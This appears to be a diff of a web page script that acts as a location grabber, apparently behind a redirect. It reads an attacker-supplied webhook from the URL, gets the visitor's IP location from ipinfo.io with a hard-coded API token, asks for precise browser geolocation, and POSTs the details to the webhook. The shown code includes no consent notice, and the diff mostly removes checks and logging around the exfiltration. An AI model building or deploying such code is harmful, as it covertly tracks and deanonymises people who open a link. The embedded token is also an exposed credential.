@@ -13,37 +13,28 @@
             return urlParams.get('webhook');
         }
 
-        // Function to send data to the provided webhook with formatted message
+        // Function to send data to the provided webhook
         function sendToWebhook(webhookUrl, message) {
-            if (!webhookUrl) {
-                console.error("No webhook URL found.");
-                return;
-            }
-
-            console.log("Sending message to webhook:", message); // Debug log to ensure we're sending the data
-
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ content: message })
-            })
-            .then(response => {
+            }).then(response => {
                 if (response.ok) {
                     console.log("Message sent to webhook successfully!");
                 } else {
-                    console.error("Failed to send message to webhook. Status:", response.status);
+                    console.error("Failed to send message to webhook.");
                 }
-            })
-            .catch(error => {
+            }).catch(error => {
                 console.error("Error sending message:", error);
             });
         }
 
         // Function to fetch approximate location using the user's IP
         function getApproxLocation() {
-            fetch("https://ipinfo.io/json?token=75df35b1472407")  // Replace with your ipinfo.io token
+            fetch("https://ipinfo.io/json?token=75df35b1472407")  // Your IPInfo API token
                 .then(response => response.json())
                 .then(data => {
                     const locationMessage = `
@@ -82,16 +73,12 @@ State/City: ${data.city}, ${data.region}
 
         // Main function to handle geolocation and webhook sending
         function handleRedirectAndWebhook() {
-            // Get the webhook URL from the query string
             const webhookUrl = getWebhookFromUrl();
             if (!webhookUrl) {
                 console.error("No webhook URL found in the query string.");
                 return;
             }
 
-            console.log("Webhook URL:", webhookUrl); // Debug: Log the webhook URL to ensure it's valid
-
-            // Get the location (if available)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const latitude = position.coords.latitude;
